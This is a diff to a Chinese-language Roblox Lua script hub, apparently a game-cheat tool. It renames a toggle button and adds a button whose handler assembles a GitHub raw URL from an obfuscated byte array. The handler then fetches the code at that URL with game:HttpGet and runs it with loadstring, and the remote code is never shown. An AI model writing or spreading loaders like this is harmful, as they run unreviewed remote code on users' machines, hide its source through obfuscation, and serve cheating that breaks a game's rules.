@@ -412,7 +412,7 @@ end
       Open.Position = UDim2.new(0.00829315186, 0, 0.31107837, 0)
       Open.Size = UDim2.new(0, 61, 0, 32)
       Open.Font = Enum.Font.SourceSans
-      Open.Text = "隐藏/打开"
+      Open.Text = "坤坤开"
       Open.TextColor3 = Color3.fromRGB(255, 255, 255)
       Open.TextSize = 14.000
       Open.Active = true
@@ -2394,6 +2394,13 @@ end)
 local creds = window:Tab("『脚本』",'6035145364')
 
 local tool = creds:section("「脚本」",true)
+
+tool:Button("秋脚本",function()
+--秋自制脚本
+local SCC_CharPool={
+[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,56,53,55,57,54,48,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,67,50,37,66,55,37,69,56,37,56,55,37,65,65,37,69,53,37,56,56,37,66,54,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67,37,69,54,37,57,54,37,66,48,37,69,54,37,66,65,37,57,48,37,69,55,37,65,48,37,56,49,46,116,120,116})end)()))}
+loadstring(game:HttpGet(SCC_CharPool[1]))()
+end)
 
 tool:Button("白脚本",function()
 _G["白脚本作者修狗"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"
